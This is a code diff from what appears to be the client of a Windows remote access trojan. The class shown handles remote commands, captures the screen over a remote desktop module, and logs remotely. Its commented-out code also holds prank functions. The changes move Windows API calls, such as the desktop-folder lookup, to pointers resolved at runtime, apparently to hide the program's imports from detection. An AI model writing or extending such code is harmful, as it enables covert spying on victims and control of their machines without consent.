@@ -114,22 +114,7 @@ Cliente::Cliente() {
 }
 
 void Cliente::TEST() {
-    /*this->mod_dynamic->LoadFunProcs();
-    this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
-    this->mod_Fun->m_CD(TRUE);
-    this->mod_Fun->m_Msg("1337 :v", "Testing", MB_ICONERROR);
-
-    this->mod_dynamic->LoadRDProcs();
-    this->mod_RemoteDesk = new mod_RemoteDesktop(this->mod_dynamic->USER32_RD, this->mod_dynamic->GDI32_RD, this->mod_dynamic->GDIPLUS_RD, this->mod_dynamic->OLE32);*/
-
-    this->mod_dynamic->LoadRDProcs();
-    this->mod_RemoteDesk = new mod_RemoteDesktop(this->mod_dynamic->USER32_RD,
-        this->mod_dynamic->GDI32_RD,
-        this->mod_dynamic->GDIPLUS_RD,
-        this->mod_dynamic->OLE32);
-    std::vector<Monitor> test = this->mod_RemoteDesk->m_ListaMonitores();
-    this->mod_RemoteDesk->EnviarCaptura(32, 0);
-    this->DestroyClasses();
+    return;
 }
 
 Cliente::~Cliente() {
@@ -723,7 +708,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 this->mod_dynamic->USER32_RD, 
                 this->mod_dynamic->GDI32_RD, 
                 this->mod_dynamic->GDIPLUS_RD, 
-                this->mod_dynamic->OLE32);
+                this->mod_dynamic->OLE32,
+                this->mod_dynamic->KERNEL32);
         }
         std::string strPaquete = "";
         std::vector<Monitor> Monitores = this->mod_RemoteDesk->m_ListaMonitores();
@@ -758,7 +744,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 this->mod_dynamic->USER32_RD,
                 this->mod_dynamic->GDI32_RD,
                 this->mod_dynamic->GDIPLUS_RD,
-                this->mod_dynamic->OLE32);
+                this->mod_dynamic->OLE32,
+                this->mod_dynamic->KERNEL32);
         }
         //Si esta creado pero si no se esta en modo live
         if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
@@ -783,7 +770,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 this->mod_dynamic->USER32_RD,
                 this->mod_dynamic->GDI32_RD,
                 this->mod_dynamic->GDIPLUS_RD,
-                this->mod_dynamic->OLE32);
+                this->mod_dynamic->OLE32,
+                this->mod_dynamic->KERNEL32);
         }
         if (this->mod_RemoteDesk) {
             strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
@@ -1491,8 +1479,10 @@ void Cliente::m_RemoteLog(const std::string _strMsg) {
 //Misc
 std::string Cliente::ObtenerDesk() {
     TCHAR szTemp[MAX_PATH];
-    if (SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, szTemp) == S_OK) {
-        return std::string(szTemp) + "\\";
+    if (this->mod_dynamic->SHELL32.pSHGetFolderPathA) {
+        if (this->mod_dynamic->SHELL32.pSHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, szTemp) == S_OK) {
+            return std::string(szTemp) + "\\";
+        }
     }
     return std::string("-");
 }
